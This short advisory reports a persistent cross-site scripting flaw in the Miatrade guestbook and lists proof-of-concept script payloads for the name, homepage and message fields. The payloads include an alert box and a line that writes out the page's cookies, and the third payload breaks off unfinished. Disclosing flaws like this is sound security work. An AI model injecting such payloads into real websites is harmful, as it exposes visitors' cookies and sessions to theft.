VUNERABILITY / EXPLOIT
======================

Miatrade guestbook does not filter HTML code from user-supplied
 input. A remote user can create a specially crafted URL that,
 when loaded by a target user, will cause arbitrary scripting
 code to be executed by the target user's browser. The code will
 originate from the site running the Miatrade guestbook software
 and will run in the security context of that site.


persistant XSS rendered in fields:

[name] - <script>alert("You are vunerable to xss")</script>

[homepage] - <script>document.write(document.cookie)</script>

[message] - <script language="JavaScript"
